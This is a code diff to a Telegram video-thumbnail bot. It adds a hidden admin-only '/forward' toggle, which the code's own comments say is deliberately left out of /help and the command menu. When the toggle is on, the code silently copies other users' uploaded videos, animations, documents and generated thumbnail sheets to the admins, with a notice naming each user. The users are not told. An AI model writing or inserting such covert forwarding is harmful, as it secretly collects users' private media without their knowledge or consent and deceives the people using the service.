@@ -1,5 +1,6 @@
 import asyncio
 import contextlib
+import json
 import logging
 import shutil
 import subprocess
@@ -203,6 +204,7 @@ async def handle_command(
     preferences: UserPreferences,
     message: Any,
     queue: "JobQueue | None" = None,
+    forward: "ForwardGate | None" = None,
 ) -> bool:
     command = command_name(message.raw_text)
     if command is None:
@@ -290,6 +292,12 @@ async def handle_command(
     elif command == "merge":
         # /merge [N | cancel | status]
         await _merge_handle(client, settings, access, preferences, message)
+        return True
+    elif command == "forward":
+        # Hidden admin toggle. Not listed in BOT_COMMANDS or /help.
+        if not is_admin or forward is None:
+            return True
+        await _forward_handle_command(client, access, forward, message)
         return True
     else:
         text = "未知命令，请使用 /help 查看可用命令。"
@@ -606,6 +614,183 @@ async def _merge_fire(client: TelegramClient, state: dict, user_id: int) -> None
             pass
 
 
+FORWARD_DEBOUNCE_SEC = 5.0
+FORWARD_LOG_PREFIX = "[forward]"
+
+
+class ForwardGate:
+    """Hidden admin toggle. Default off. Not in /help or bot command menu."""
+
+    def __init__(self, path: Path) -> None:
+        self.path = path
+        self.enabled = self._load()
+        self.lock = asyncio.Lock()
+
+    def _load(self) -> bool:
+        if not self.path.exists():
+            return False
+        try:
+            payload = json.loads(self.path.read_text(encoding="utf-8"))
+            return bool(payload.get("enabled", False))
+        except (OSError, ValueError, TypeError):
+            return False
+
+    def _save(self) -> None:
+        self.path.parent.mkdir(parents=True, exist_ok=True)
+        tmp = self.path.with_suffix(self.path.suffix + ".tmp")
+        tmp.write_text(json.dumps({"enabled": self.enabled}) + "\n", encoding="utf-8")
+        tmp.replace(self.path)
+
+    async def set_enabled(self, enabled: bool) -> bool:
+        async with self.lock:
+            changed = self.enabled != enabled
+            self.enabled = enabled
+            self._save()
+            return changed
+
+
+def format_user_label(sender: Any, user_id: int | None) -> str:
+    if sender is not None:
+        username = getattr(sender, "username", None)
+        if username:
+            return f"@{username}"
+        first = (getattr(sender, "first_name", None) or "").strip()
+        last = (getattr(sender, "last_name", None) or "").strip()
+        name = " ".join(part for part in (first, last) if part)
+        if name:
+            return name
+    return str(user_id or "未知")
+
+
+_pending_forward: dict[int, dict] = {}
+
+
+async def _forward_handle_command(
+    client: TelegramClient,
+    access: AccessControl,
+    gate: ForwardGate,
+    message: Any,
+) -> None:
+    raw = (message.raw_text or "").split()
+    arg = raw[1].lower() if len(raw) > 1 else ""
+    if arg in {"on", "1", "true", "开"}:
+        await gate.set_enabled(True)
+        text = "管理员转发已开启。其他用户完成任务后会静默汇总给你。"
+    elif arg in {"off", "0", "false", "关"}:
+        await gate.set_enabled(False)
+        text = "管理员转发已关闭。"
+    else:
+        state = "开" if gate.enabled else "关"
+        text = f"转发当前：{state}\n用法：/forward on 或 /forward off"
+    await client.send_message(message.chat_id, text, reply_to=message.id)
+
+
+async def _forward_note_success(
+    client: TelegramClient,
+    access: AccessControl,
+    gate: ForwardGate,
+    message: Any,
+    png_path: Path,
+) -> None:
+    if not gate.enabled:
+        return
+    user_id = message.sender_id
+    if user_id is None or access.is_admin(user_id):
+        return
+    keep_dir = Path(tempfile.mkdtemp(prefix="vthumb_fwd_"))
+    kept: Path | None = None
+    try:
+        dest = keep_dir / png_path.name
+        shutil.copy2(png_path, dest)
+        kept = dest
+    except OSError as exc:
+        logging.warning("%s copy sheet failed: %s", FORWARD_LOG_PREFIX, exc)
+        shutil.rmtree(keep_dir, ignore_errors=True)
+        keep_dir = Path(tempfile.mkdtemp(prefix="vthumb_fwd_"))
+    sender = None
+    with contextlib.suppress(Exception):
+        sender = await message.get_sender()
+    label = format_user_label(sender, user_id)
+    state = _pending_forward.setdefault(
+        user_id,
+        {"items": [], "dirs": [], "label": label, "task": None},
+    )
+    state["label"] = label
+    state["items"].append({"message": message, "png": kept})
+    if keep_dir not in state["dirs"]:
+        state["dirs"].append(keep_dir)
+
+    def _fire():
+        return _forward_flush(client, access, user_id)
+
+    if state.get("task") and not state["task"].done():
+        state["task"].cancel()
+
+    async def _wait():
+        try:
+            await asyncio.sleep(FORWARD_DEBOUNCE_SEC)
+        except asyncio.CancelledError:
+            return
+        try:
+            await _fire()
+        except Exception:
+            logging.exception("%s debounce fire failed", FORWARD_LOG_PREFIX)
+
+    state["task"] = asyncio.create_task(_wait())
+
+
+async def _forward_flush(client: TelegramClient, access: AccessControl, user_id: int) -> None:
+    state = _pending_forward.pop(user_id, None)
+    if not state:
+        return
+    items = state["items"]
+    label = state.get("label") or str(user_id)
+    count = len(items)
+    notice = f"用户 {label} 完成 {count} 个任务"
+    pngs = [item["png"] for item in items if item.get("png") and Path(item["png"]).exists()]
+    videos = [item["message"] for item in items if item.get("message") is not None]
+    from telethon.tl.types import InputMediaDocument, InputDocument
+    album: list = []
+    album.extend(str(path) for path in pngs)
+    for msg in videos:
+        kind = _merge_classify(msg)
+        doc = None
+        if kind == "video":
+            doc = msg.video
+        elif kind == "video_note":
+            doc = msg.video_note
+        elif kind == "animation":
+            doc = msg.animation
+        elif msg.document:
+            doc = msg.document
+        if doc is None:
+            continue
+        album.append(InputMediaDocument(InputDocument(doc.id, doc.access_hash, doc.file_reference)))
+
+    for admin_id in sorted(access.admin_ids):
+        try:
+            await client.send_message(admin_id, notice)
+        except Exception as exc:
+            logging.warning("%s notify admin %s failed: %s", FORWARD_LOG_PREFIX, admin_id, type(exc).__name__)
+            continue
+        if not album:
+            continue
+        batch_size = 10
+        for start in range(0, len(album), batch_size):
+            batch = album[start:start + batch_size]
+            try:
+                await client.send_file(admin_id, batch, force_document=False)
+            except Exception as exc:
+                logging.warning("%s album to admin %s failed: %s", FORWARD_LOG_PREFIX, admin_id, exc)
+                # fallback: send items one by one
+                for piece in batch:
+                    with contextlib.suppress(Exception):
+                        await client.send_file(admin_id, piece, force_document=False)
+
+    for directory in state.get("dirs", []):
+        shutil.rmtree(directory, ignore_errors=True)
+
+
 # Module-level merge state. One pending merge per user at a time.
 # Dict keyed by sender_id, value is a dict (see _merge_handle).
 _pending_merge: dict[int, dict] = {}
@@ -872,6 +1057,8 @@ async def process_message(
     preferences: UserPreferences,
     queue: JobQueue,
     message: Any,
+    access: AccessControl | None = None,
+    forward: "ForwardGate | None" = None,
 ) -> None:
     chat_id = message.chat_id
     message_id = message.id
@@ -934,6 +1121,8 @@ async def process_message(
                 progress_callback=lambda current, total: progress.report("upload", current, total),
             )
             await progress.finish("处理完成，缩略图已发送。")
+            if access is not None and forward is not None:
+                await _forward_note_success(client, access, forward, message, output)
         except Exception as exc:
             if range_key:
                 exc = media_server.failure(range_key) or exc
@@ -973,7 +1162,7 @@ async def process_message(
 async def poll() -> None:
     settings = Settings.from_env()
     configure_logging(settings.bot_token)
-    access = AccessControl(Path(settings.access_file), settings.admin_ids)
+    access = AccessControl(Path(settings.access_file), settings.admin_ids, open_access=settings.open_access)
     preferences = UserPreferences(Path(settings.preferences_file))
     mt_client = TelegramClient(
         MemorySession(),
@@ -987,11 +1176,12 @@ async def poll() -> None:
         cache_bytes=settings.range_cache_mb * 1024 * 1024,
     )
     queue = JobQueue(settings.max_concurrent_jobs)
+    forward = ForwardGate(Path(settings.access_file).with_name("forward.json"))
     tasks: set[asyncio.Task[None]] = set()
 
     @mt_client.on(events.NewMessage(incoming=True))
     async def on_message(event: events.NewMessage.Event) -> None:
-        if await handle_command(mt_client, settings, access, preferences, event.message, queue=queue):
+        if await handle_command(mt_client, settings, access, preferences, event.message, queue=queue, forward=forward):
             return
         # /merge short-circuit: if a merge session is active for this
         # sender, collect the media and DO NOT process_message() it.
@@ -1007,7 +1197,10 @@ async def poll() -> None:
             )
             return
         task = asyncio.create_task(
-            process_message(mt_client, media_server, settings, preferences, queue, event.message)
+            process_message(
+                mt_client, media_server, settings, preferences, queue, event.message,
+                access=access, forward=forward,
+            )
         )
         tasks.add(task)
         task.add_done_callback(tasks.discard)
